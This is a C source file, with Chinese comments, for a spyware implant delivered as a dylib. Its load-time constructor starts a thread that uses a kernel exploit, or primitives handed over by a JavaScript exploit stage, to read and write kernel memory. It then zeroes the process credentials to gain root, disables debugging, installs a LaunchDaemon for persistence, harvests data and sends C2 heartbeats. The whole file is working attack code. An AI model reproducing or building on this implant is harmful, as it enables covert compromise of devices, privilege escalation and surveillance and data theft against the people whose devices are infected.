#include "memory.h"
#include "offsets.h"
#include "kernel_exploit.h"
#include "injection.h"
#include "persistence.h"
#include "c2.h"
#include "stealth.h"
#include "data_harvest.h"
#include <pthread.h>
#include <unistd.h>

/* ── Privilege escalation (requires kernel r/w primitives) ─────────────────── */
static void elevate_to_root(void) {
    const KernelOffsets *off = get_kernel_offsets();
    if (!off) return;

    uint64_t kbase = kernel_base();
    if (!kbase) return;

    /*
     * allproc_offset 存的是相对偏移（静态 VA − 0xFFFFFFF007004000），
     * 加上运行时 kernel_base 得到 allproc 的运行时地址。
     */
    uint64_t allproc = kbase + off->allproc_offset;

    /* 遍历 allproc 链表找到当前进程 */
    uint64_t self = kread64(allproc);
    while (self) {
        pid_t pid = (pid_t)kread64(self + off->proc_p_pid);
        if (pid == getpid()) break;
        self = kread64(self + off->proc_p_list_next);
    }
    if (!self) return;

    /* 把 uid/ruid/svuid 全置 0 → root */
    uint64_t ucred = kread64(self + off->proc_p_ucred);
    kwrite64(ucred + off->ucred_cr_uid,   0);
    kwrite64(ucred + off->ucred_cr_ruid,  0);
    kwrite64(ucred + off->ucred_cr_svuid, 0);
    setuid(0); setgid(0);
}

/* ── Background implant entry point ────────────────────────────────────────── */
static void *implant_main(void *arg) {
    (void)arg;

    /*
     * 内核原语获取策略（按优先级）：
     *
     *  1. ke_run() — 自内置物理 OOB exploit (pe_v1) 建立 kread64/kwrite64/kbase，
     *     成功后直接调用 coruna_init_primitives()。
     *
     *  2. coruna_hook_slot — 若 ke_run() 失败（A18 或 OOB 超时），
     *     等待 Stage3_VariantB.js 通过 exploitPrimitive.write64 写入外部 VA。
     *     此路径需要 JS 端提供真实内核 VA（通常为 0，实际无法提权）。
     *
     *  两条路都失败时降级：跳过提权，仍执行数据采集。
     */

    /* 路径 1: 自举内核 exploit */
    if (!kernel_base()) {
        ke_run(); /* 内部会调用 coruna_init_primitives，成功后 kernel_base() != 0 */
    }

    /* 路径 2: 等待 Stage3 写入 hook_slot (最多约 5 s) */
    for (int i = 0; i < 50 && !kernel_base(); i++) {
        volatile uint64_t m = coruna_hook_slot[3];
        if (m == (uint64_t)CORUNA_HOOK_MAGIC) {
            coruna_init_primitives_from_addrs(
                (uint64_t)coruna_hook_slot[0],
                (uint64_t)coruna_hook_slot[1],
                (uint64_t)coruna_hook_slot[2]);
            coruna_hook_slot[3] = 0;
            break;
        }
        usleep(100000);
    }

    if (kernel_base()) {
        apply_anti_debug();
        elevate_to_root();
        install_launchdaemon();
    }

    harvest_all();

    while (1) {
        c2_heartbeat();
        sleep(30);
    }
    return NULL;
}

/* ── dylib constructor ──────────────────────────────────────────────────────── */
__attribute__((constructor))
void coruna_constructor(void) {
    pthread_t tid;
    if (pthread_create(&tid, NULL, implant_main, NULL) == 0)
        pthread_detach(tid);
}
